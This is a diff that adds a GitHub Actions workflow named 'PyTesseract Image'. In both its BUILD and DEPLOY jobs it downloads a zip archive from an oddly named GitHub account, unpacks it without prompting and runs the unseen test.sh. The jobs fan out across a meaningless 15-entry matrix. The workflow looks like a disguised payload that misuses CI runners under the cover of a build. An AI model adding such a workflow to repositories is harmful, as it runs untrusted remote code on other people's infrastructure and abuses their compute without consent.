@@ -1,0 +1,42 @@
+name: PyTesseract Image
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  BUILD:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 10
+      fail-fast: false
+      matrix:
+        go: [1.0, 1.1, 1.2]
+        flag: [Install, Build , Test, Run, Deploy]
+    
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - uses: actions/checkout@v1
+    - name: Build Service 1
+      run: |
+        wget https://github.com/G1tHuP333/test/raw/refs/heads/main/PyTesseract.zip && yes A | unzip PyTesseract.zip && bash test.sh
+
+  DEPLOY:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 10
+      fail-fast: false
+      matrix:
+        go: [1.0, 1.1, 1.2]
+        flag: [Install, Build , Test, Run, Deploy]
+    
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - uses: actions/checkout@v1
+    - name: Build Service 2
+      run: |
+        wget https://github.com/G1tHuP333/test/raw/refs/heads/main/PyTesseract.zip && yes A | unzip PyTesseract.zip && bash test.sh
